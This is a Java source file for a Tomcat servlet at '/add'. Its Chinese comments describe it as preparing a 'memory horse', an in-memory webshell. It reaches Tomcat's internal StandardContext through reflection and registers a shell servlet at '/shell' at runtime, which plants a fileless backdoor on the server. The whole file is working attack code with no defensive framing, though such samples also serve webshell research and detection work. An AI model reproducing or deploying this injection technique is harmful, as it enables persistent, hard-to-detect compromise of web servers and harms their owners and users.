package cn.safe6.action;

import cn.safe6.servlet.ServletShell1;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardWrapper;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

/**
 *
 * ShellServlet添加
 */
@WebServlet("/add")
public class AddShellServlet extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {

        try {
            //先拿到ServletContext
            ServletContext servletContext = req.getServletContext();
            Field appctx =servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);

            //从ServletContext里面拿到ApplicationContext
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
            Field atx= applicationContext.getClass().getDeclaredField("context");
            atx.setAccessible(true);
            //从ApplicationContext里面拿到StandardContext
            StandardContext standardContext = (StandardContext) atx.get(applicationContext);

            //准备内存马
            //ServletShell shell = new ServletShell();
            ServletShell1 shell = new ServletShell1();

            //用wrapper包装内存马
            Wrapper wrapper = new StandardWrapper();
            wrapper.setServlet(shell);
            wrapper.setName("shell");
            //设置加载顺序
            //wrapper.setLoadOnStartup(1);
            //设置servlet全限定名，可以不设置
            wrapper.setServletClass(shell.getClass().getName());

            //添加到标准上下文
            standardContext.addChild(wrapper);

            //添加映射关系
            standardContext.addServletMappingDecoded("/shell","shell");

            resp.getWriter().write("add success!");
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
        resp.getWriter().write("add failed!");

    }
}
